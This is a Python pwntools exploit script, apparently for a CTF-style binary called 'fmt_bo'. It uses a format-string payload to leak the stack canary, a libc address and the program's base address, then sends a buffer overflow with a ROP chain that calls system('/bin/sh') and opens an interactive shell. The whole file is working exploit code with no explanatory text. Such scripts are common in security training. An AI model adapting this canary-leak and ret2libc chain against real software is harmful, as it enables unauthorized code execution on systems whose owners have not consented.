#!/usr/bin/python3
from pwn import * 

elf = context.binary = ELF('./fmt_bo')
context.log_level = 'error'
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#for i in range(50):
#    io = process()
#    payload = f'AAAAAAAA%{i}$p'.encode()
#    io.sendline(payload)
#    io.sendline(b'enem')
#    print(io.recvall(),i)

io = process()
payload = b'%23$p.%25$p.%27$p'
io.sendline(payload)
io.recvuntil(b'Enter String - ')
leak = io.recvline().split(b'.')
canary = int(leak[0],16)
libc.address = int(leak[1],16) -  0x29ca8
elf.address = int(leak[2],16) -  0x11a9

print(hex(canary))
print(hex(libc.address))
print(hex(elf.address))

payload = b'A'*136
payload += pack(canary)
payload += pack(0)
payload += pack(elf.address + 0x00000000000012b3)
payload += pack(next(libc.search(b'/bin/sh')))
payload += pack(elf.address + 0x000000000000101a)
payload += pack(libc.sym.system)

io.sendline(payload)

io.interactive()
